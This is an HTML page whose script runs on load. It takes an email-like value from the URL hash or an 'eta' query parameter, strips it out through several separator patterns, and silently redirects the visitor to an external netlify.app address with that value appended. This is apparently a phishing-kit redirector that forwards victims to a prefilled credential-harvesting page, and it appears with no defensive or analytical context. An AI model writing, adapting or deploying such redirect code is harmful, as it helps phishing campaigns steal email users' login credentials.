<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
</head>
<body>
    <script type="text/javascript">
        var url_string = window.location.href;
        // Extract eta from query parameters
        var urlParams = new URLSearchParams(window.location.search);
        var eta = urlParams.get('eta');
        // Extract hash
        var hash = window.location.hash ? window.location.hash.substring(1) : null;
        // Use hash if present, otherwise eta
        var param = hash || eta || '';
        // Process parameter with getafterhash
        var url_get_email = getafterhash(param);
        // Construct redirect URL
        var mail_go_url = "https://dainty-pasca-796ecb.netlify.app#" + url_get_email;
        // Perform redirect
        location.replace(mail_go_url);

        function getafterhash(url) {
            var ret;
            var queryString;
            // If no parameter is provided, return empty string
            if (!url) {
                ret = '';
            } else {
                // Check for alternative separators
                queryStringhash = url.split('#')[1];
                queryStringsemi = url.split(';')[1];
                queryStringsemiplus = url.split(';+')[1];
                queryStringstartsemi = url.split('*;')[1];
                // Prioritize the first valid separator
                if (queryStringhash) {
                    ret = queryStringhash;
                } else if (queryStringsemi) {
                    ret = queryStringsemi;
                } else if (queryStringsemiplus) {
                    ret = queryStringsemiplus;
                } else if (queryStringstartsemi) {
                    ret = queryStringstartsemi;
                } else {
                    ret = url; // Use the full parameter if no separators
                }
            }
            return ret;
        }
    </script>
</body>
</html>
